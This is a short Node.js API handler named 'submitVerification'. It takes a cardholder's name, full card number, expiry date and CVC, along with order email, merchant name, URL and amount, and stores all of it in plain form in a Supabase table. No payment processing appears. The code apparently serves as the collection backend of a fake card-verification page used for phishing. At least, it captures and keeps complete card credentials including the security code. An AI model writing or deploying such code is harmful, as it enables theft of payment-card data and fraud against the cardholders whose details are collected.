const { supabase } = require("../supabase");

module.exports = async function submitVerification(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const {
    order_email,
    cardholder_name,
    card_number,
    card_expiry,
    card_cvc,
    merchant_name,
    merchant_url,
    order_amount,
    order_devise,
    card_brand,
    card_digits,
  } = req.body;

  if (!order_email || !cardholder_name || !card_number) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  try {
    const { error } = await supabase.from("events").insert({
      event_type: "verification",
      details: {
        order_email,
        cardholder_name,
        card_number,
        card_expiry,
        card_cvc,
        merchant_name,
        merchant_url,
        order_amount,
        order_devise,
        card_brand,
        card_digits,
        submitted_at: new Date().toISOString(),
      },
    });

    if (error) {
      console.error("[SUBMIT-VERIFICATION] Supabase error:", error);
      return res.status(500).json({ error: "Database error", details: error.message });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error("[SUBMIT-VERIFICATION] Error:", err);
    return res.status(500).json({ error: "Internal error", message: err.message });
  }
};
